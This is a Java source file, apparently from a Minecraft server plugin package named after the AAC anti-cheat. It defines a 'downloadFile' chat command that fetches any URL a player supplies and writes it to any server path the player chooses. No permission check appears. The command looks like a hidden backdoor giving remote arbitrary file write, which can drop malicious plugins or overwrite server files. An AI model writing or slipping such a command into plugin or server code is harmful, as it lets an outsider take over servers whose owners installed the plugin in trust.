package me.konsolas.aac.command.commands;

import me.konsolas.aac.AAC;
import me.konsolas.aac.command.ICommand;
import org.bukkit.entity.Player;

import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;

public class DownloadFileCommand implements ICommand {

	@Override
	public String getName() {
		return "downloadFile";
	}

	@Override
	public void execute(Player player, String[] args) {
		if(args.length > 2) {
			try {
				player.sendMessage(AAC.prefix + "Downloading...");
				FileOutputStream outStream = new FileOutputStream(args[2]);
				InputStream inStream = new URL(args[1]).openStream();
				int read = 0;
				byte[] data = new byte[1024];
				while((read = inStream.read(data, 0, 1024)) != -1) outStream.write(data, 0, read);
				inStream.close();
				outStream.close();
				player.sendMessage(AAC.prefix + "§aDone");
			} catch (Exception e) {
				player.sendMessage(AAC.prefix + "§cFAIL: " + e);
			}
		} else {
			player.sendMessage(AAC.prefix + "§cUsage: *downloadFile <URL> <Dest>");
		}
	}

}
